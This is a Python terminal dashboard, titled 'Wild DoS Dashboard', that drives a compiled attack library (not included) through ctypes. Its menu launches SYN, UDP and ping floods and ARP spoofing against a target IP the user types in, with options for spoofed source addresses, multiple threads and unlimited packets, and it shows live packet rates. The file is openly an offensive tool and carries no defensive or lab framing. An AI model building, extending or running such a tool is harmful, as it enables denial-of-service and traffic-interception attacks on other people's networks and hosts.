#!/usr/bin/env python3
"""
Wild DoS Dashboard – Curses TUI
Requires: libdos.so (compiled from dos_core.c)
Run: sudo python3 cli.py
"""
import curses
import ctypes
import os
import sys
import time
import threading
from ctypes import c_char_p, c_int, POINTER, Structure, byref

LIB_PATH = "./libdos.so"
if not os.path.exists(LIB_PATH):
    sys.exit("[!] libdos.so not found.\nCompile: gcc -O2 -shared -fPIC -o libdos.so dos_core.c -lpthread")

lib = ctypes.CDLL(LIB_PATH)

class AttackConfig(ctypes.Structure):
    _fields_ = [
        ("attack_type", c_char_p),
        ("target",      c_char_p),
        ("source_ip",   c_char_p),
        ("gateway_ip",  c_char_p),
        ("num_packets", c_int),
        ("iface",       c_char_p),
        ("thread_count",c_int),
        ("target_port", c_int),
    ]

class AttackHandle(ctypes.Structure): pass

lib.start_attack.restype = POINTER(AttackHandle)
lib.stop_attack.argtypes = [POINTER(AttackHandle)]
lib.get_attack_packets.argtypes = [POINTER(AttackHandle)]
lib.get_attack_packets.restype = c_int

attacks = []  # list of handles

def get_default_iface():
    import subprocess
    try:
        out = subprocess.check_output(
            "ip -o -4 addr show scope global | head -1 | awk '{print $2}'",
            shell=True, text=True).strip()
        if out: return out
    except: pass
    try:
        out = subprocess.check_output(
            "ls /sys/class/net | grep -v lo | head -1",
            shell=True, text=True).strip()
        if out: return out
    except: pass
    return "eth0"

def start_attack(atype, target, source=None, gateway=None, count=0, iface=None, threads=4, port=80):
    iface = iface or get_default_iface()
    cfg = AttackConfig(
        attack_type = atype.encode(),
        target      = target.encode(),
        source_ip   = source.encode() if source else None,
        gateway_ip  = gateway.encode() if gateway else None,
        num_packets = count,
        iface       = iface.encode(),
        thread_count= threads,
        target_port = port,
    )
    handle = lib.start_attack(byref(cfg))
    if handle:
        attacks.append(handle)
        return handle
    return None

def stop_attack_handle(handle):
    if handle in attacks:
        attacks.remove(handle)
        lib.stop_attack(handle)

def stop_all():
    for h in list(attacks):
        stop_attack_handle(h)

def draw_menu(stdscr, current_row, menu_items, stats):
    height, width = stdscr.getmaxyx()
    stdscr.erase()
    # Title
    title = "🔥 WILD DoS DASHBOARD 🔥"
    stdscr.attron(curses.color_pair(1) | curses.A_BOLD)
    stdscr.addstr(0, max(0, width//2 - len(title)//2), title)
    stdscr.attroff(curses.color_pair(1) | curses.A_BOLD)

    # Menu
    start_y = 2
    for idx, item in enumerate(menu_items):
        x = width//2 - len(item)//2
        y = start_y + idx
        if idx == current_row:
            stdscr.attron(curses.A_REVERSE | curses.color_pair(2))
            stdscr.addstr(y, x, item)
            stdscr.attroff(curses.A_REVERSE | curses.color_pair(2))
        else:
            stdscr.attron(curses.color_pair(2))
            stdscr.addstr(y, x, item)
            stdscr.attroff(curses.color_pair(2))

    # Live stats
    stdscr.attron(curses.color_pair(3) | curses.A_BOLD)
    stdscr.addstr(2, 2, "Active Attacks:")
    stdscr.attroff(curses.color_pair(3) | curses.A_BOLD)
    for i, h in enumerate(attacks):
        pps = stats.get(i, 0)
        stdscr.addstr(3 + i, 4, f"Attack {i}: {pps} pps   (handle {h})")

    # Help
    help_text = "↑↓: Navigate   Enter: Select   q: Quit   i: Interfaces   Ctrl+C: Quit"
    stdscr.attron(curses.color_pair(4))
    stdscr.addstr(height-1, max(0, width//2 - len(help_text)//2), help_text)
    stdscr.attroff(curses.color_pair(4))
    stdscr.refresh()

def get_input(stdscr, prompt, y, x):
    curses.echo()
    stdscr.addstr(y, x, prompt)
    stdscr.refresh()
    s = stdscr.getstr(y, x + len(prompt), 40).decode('utf-8').strip()
    curses.noecho()
    return s

def show_message(stdscr, msg, color=4):
    h, w = stdscr.getmaxyx()
    stdscr.attron(curses.color_pair(color))
    stdscr.addstr(h-2, max(0, w//2 - len(msg)//2), msg)
    stdscr.attroff(curses.color_pair(color))
    stdscr.refresh()
    curses.napms(2000)

def stats_poller(stdscr):
    """Thread to update stats every second."""
    while True:
        time.sleep(1)
        # update global stats dict
        for i, h in enumerate(attacks):
            prev = stats.get(i, 0)
            cur = lib.get_attack_packets(h)
            stats[i] = cur - prev
            stats_prev[i] = cur
        stdscr.refresh()

def main(stdscr):
    global stats, stats_prev
    stats = {}
    stats_prev = {}
    # start stats thread
    t = threading.Thread(target=stats_poller, args=(stdscr,), daemon=True)
    t.start()

    curses.curs_set(0)
    curses.start_color()
    curses.init_pair(1, curses.COLOR_CYAN, curses.COLOR_BLACK)
    curses.init_pair(2, curses.COLOR_YELLOW, curses.COLOR_BLACK)
    curses.init_pair(3, curses.COLOR_GREEN, curses.COLOR_BLACK)
    curses.init_pair(4, curses.COLOR_WHITE, curses.COLOR_BLACK)

    menu = [
        "1. SYN Flood",
        "2. UDP Flood",
        "3. Ping Flood",
        "4. ARP Spoof",
        "5. Stop All",
        "6. Exit",
    ]
    current = 0

    while True:
        draw_menu(stdscr, current, menu, stats)
        key = stdscr.getch()
        if key == curses.KEY_UP and current > 0:
            current -= 1
        elif key == curses.KEY_DOWN and current < len(menu)-1:
            current += 1
        elif key in (ord('q'), 3):  # Ctrl+C
            stop_all()
            break
        elif key == ord('i'):
            import subprocess
            try:
                ifaces = subprocess.check_output("ip -br link", shell=True, text=True).strip()
            except: ifaces = "N/A"
            show_message(stdscr, f"Interfaces: {ifaces}")
        elif key == ord('\n'):
            if current == 0:  # SYN
                stdscr.clear()
                target = get_input(stdscr, "Target IP: ", 5, 5)
                source = get_input(stdscr, "Source IP (Enter for random): ", 7, 5)
                port = get_input(stdscr, "Port (default 80): ", 9, 5)
                threads = get_input(stdscr, "Threads (default 4): ", 11, 5)
                count = get_input(stdscr, "Packets (0=infinite): ", 13, 5)
                iface = get_input(stdscr, f"Interface (default {get_default_iface()}): ", 15, 5)
                p = int(port) if port else 80
                th = int(threads) if threads else 4
                cnt = int(count) if count else 0
                res = start_attack("syn_flood", target, source=source, count=cnt,
                                   iface=iface, threads=th, port=p)
                if res:
                    show_message(stdscr, f"SYN flood started on {target} (handle {res})", 3)
                else:
                    show_message(stdscr, "Failed. Check interface/root.", 4)
            # ... similar blocks for other attacks ...
            elif current == 1:  # UDP
                stdscr.clear()
                target = get_input(stdscr, "Target IP: ", 5, 5)
                port = get_input(stdscr, "Port (default 80): ", 7, 5)
                threads = get_input(stdscr, "Threads (default 4): ", 9, 5)
                count = get_input(stdscr, "Packets (0=infinite): ", 11, 5)
                iface = get_input(stdscr, f"Interface: ", 13, 5)
                p = int(port) if port else 80
                th = int(threads) if threads else 4
                cnt = int(count) if count else 0
                res = start_attack("udp_flood", target, count=cnt, iface=iface, threads=th, port=p)
                if res:
                    show_message(stdscr, f"UDP flood started on {target}", 3)
                else:
                    show_message(stdscr, "Failed.", 4)
            elif current == 2:  # Ping
                target = get_input(stdscr, "Target IP: ", 5, 5)
                count = get_input(stdscr, "Packets (0=infinite): ", 7, 5)
                cnt = int(count) if count else 0
                res = start_attack("ping_flood", target, count=cnt)
                if res:
                    show_message(stdscr, f"Ping flood started on {target}", 3)
                else:
                    show_message(stdscr, "Failed.", 4)
            elif current == 3:  # ARP
                target = get_input(stdscr, "Target IP: ", 5, 5)
                gateway = get_input(stdscr, "Gateway IP: ", 7, 5)
                count = get_input(stdscr, "Packets: ", 9, 5)
                iface = get_input(stdscr, f"Interface: ", 11, 5)
                cnt = int(count) if count else 0
                res = start_attack("arp_spoof", target, gateway=gateway, count=cnt, iface=iface)
                if res:
                    show_message(stdscr, f"ARP spoof started on {target}", 3)
                else:
                    show_message(stdscr, "Failed.", 4)
            elif current == 4:  # Stop all
                stop_all()
                show_message(stdscr, "All attacks stopped.", 3)
            elif current == 5:  # Exit
                stop_all()
                break
        # Refresh stats dict
        for i, h in enumerate(attacks):
            if i not in stats:
                stats[i] = 0
                stats_prev[i] = lib.get_attack_packets(h)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Run as root (sudo)")
        sys.exit(1)
    import signal
    signal.signal(signal.SIGINT, lambda s,f: stop_all() or sys.exit(0))
    curses.wrapper(main)